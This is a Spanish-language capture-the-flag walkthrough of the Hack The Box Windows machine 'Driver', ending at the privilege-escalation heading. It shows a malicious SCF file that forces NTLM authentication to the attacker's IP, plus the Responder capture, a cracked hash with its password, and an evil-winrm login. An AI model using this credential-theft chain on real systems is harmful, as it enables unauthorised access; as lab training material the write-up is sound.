***
- Tags: 
****
Vamos a resolver la máquina Driver
- Categoría: Fácil
- Sistema: Windows
- IP: `10.10.10.106`

### 1. Enumeración

El escaneo inicial con nmap nos desvela la siguiente información:

```
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
| smb2-time: 
|   date: 2025-06-09T01:18:24
|_  start_date: 2025-06-09T01:15:54
```

Lo primero que intentamos es realizar enumeración anónima con rpcclient, pero no sirve. Tampoco nos permite hacer nada con `netexec` o `crackmapexec`:

```bash
❯ crackmapexec smb 10.10.11.106 -u '' -p '' --users
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
SMB         10.10.11.106    445    DRIVER           [-] DRIVER\: STATUS_ACCESS_DENIED 
SMB         10.10.11.106    445    DRIVER           [-] Error enumerating domain users using dc ip 10.10.11.106: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
SMB         10.10.11.106    445    DRIVER           [*] Trying with SAMRPC protocol
```

Dado que tiene el puerto 80 abierto (HTTP), navegamos a ver qué tiene. Lo primero es un formulario de iniciar sesión. Si nos fijamos bien, en el escaneo inicial con nmap para este puerto decía este mensaje: `Basic realm=MFP Firmware Update Center. Please enter password for admin`. Pues probamos a entrar con la contraseña `admin` y vemos que funciona.

![[Driver_1.png]]

Parece que tenemos permiso para subir *firmware*. Encendemos BurpSuite para capturar lo que sucede al darle al botón de Submit. 

```
POST /fw_up.php HTTP/1.1
Host: 10.10.11.106
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------18270690295094025931815558617
Content-Length: 88439
Origin: http://10.10.11.106
DNT: 1
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Referer: http://10.10.11.106/fw_up.php
Upgrade-Insecure-Requests: 1

-----------------------------18270690295094025931815558617
Content-Disposition: form-data; name="printers"

HTB Ecotank
-----------------------------18270690295094025931815558617
Content-Disposition: form-data; name="firmware"; filename="a.jpg"
Content-Type: image/jpeg
```

Ahora vamos a enumerar directorios que existan en la raíz de la web. Dado que este formulario está en la página `fw_up.php` podemos comprobar que la página interpreta código PHP, lo cual supone una ventaja por si logramos subir una reverse shell. De primeras, existe la ruta `/images`, pero al intentar acceder nos tira un 403: Forbidden. Pero pensemos un momento: volviendo al escaneo nmap, para el puerto 80, nos decía esto: 

```
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
```

Al parecer usa autenticación del tipo `basic`. Sabemos esto porque es la autorización que se utiliza cuando se obtiene una respuesta con el código 401. Podemos intentar incluir el header y tratar de enumerar directorios de nuevo. Ya sabemos que la contraseña es admin. Para poder hacer uso de este tipo de autenticación, necesitamos codificar la contraseña a base64:

```bash
❯ echo -n "admin:admin" | base64; echo
YWRtaW46YWRtaW4=
```

Ahora añadimos el header con gobuster:

```bash
gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -u http://10.10.11.106/ -x txt,bak,php,html -H "Authorization: Basic YWRtaW46YWRtaW4="
```

Pero encuentra la misma información, así que no nos sirve. Busquemos otra forma de ganar acceso. Los ficheros que se suban no acaban en el webroot del servidor HTTP, sino en un recurso de red (un “file share”). Por tanto, intentar colgar ahí un web-shell PHP/ASP no sirve porque nunca lo va a interpretar IIS/Apache, simplemente estará almacenado en SMB.

**¿Qué implica eso?**

1. **Tenemos write (escritura) en un share SMB**, no en el árbol web.    
2. Cualquier fichero que dejemos solo será accesible a través de exploraciones de recursos de red (File Explorer, scripts, etc.), no vía HTTP.    
3. **Técnica SCF**: Windows Explorer «abre» ciertos ficheros de atajo (SCF) y, al hacerlo, intenta obtener el icono remoto que le indiques. Si ese icono está en \TU_IP\recurso\icon.ico, Explorer hará una conexión SMB/NTLMv2 al host TU_IP, entregándote el hash Net-NTLMv2.

### 2. Explotación

Sabiendo ahora que vamos a tirar de SCF, tendremos que buscar cómo ganar una shell de esta forma. Según Internet, tendremos que montar un archivo con dicha extensión, siguiendo este formato:

```
[Shell]
Command=2
IconFile=<icon file>
[<thing you want to control>]
Command=<command>
```

Nuestro objetivo será obtener el hash NTLM al subir un `.scf` malicioso. Para ello, seguimos estos pasos:

1. Montar archivo malicioso:

```
[Shell]
Command=2
IconFile=\\10.10.14.18\tools\nc.ico
[Taskbar]
Command=ToggleDesktop
```

2. Montar responder:

```bash
sudo responder -wv -I tun0
```

3. Subir al panel el archivo malicioso (Importante: asegurarnos de que tiene la extensión `.scf`)
4. Esperar a obtener el hash en Responder. El resultado es este:

```
[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:038af47fdca8e1c2:4BE3D2AFA346F55278CEE28F4AD07F72:010100000000000000FFE4BBC7D8DB013C6F0057255AF2540000000002000800440057004C00440001001E00570049004E002D0047004C0041005900390038005500410058004400420004003400570049004E002D0047004C004100590039003800550041005800440042002E00440057004C0044002E004C004F00430041004C0003001400440057004C0044002E004C004F00430041004C0005001400440057004C0044002E004C004F00430041004C000700080000FFE4BBC7D8DB01060004000200000008003000300000000000000000000000002000004ACD01C7F0B8DE62284AAC3F182457EC5B8323172904BEEE9A3CCDD3EE496A9B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003800000000000000000000000000
```

Ahora nos toca o bien romper el hash o acontecer un Pass The Hash. Intentamos lo primero con hashcat, con el módulo `5600` al ser NTLMv2. 

```
hashcat -m 5600 tony.hash /usr/share/wordlists/rockyou.txt
```

Tras un rato, obtenemos la contraseña, que es `liltony`. Probamos la conexión:

![[Driver_2.png]]

Pues establecemos con `evil-winrm` una sesión:

```bash
evil-winrm -i 10.10.11.106 -u tony -p 'liltony' 
```

La flag se encuentra en el Escritorio.
### 3. Escalada de privilegios
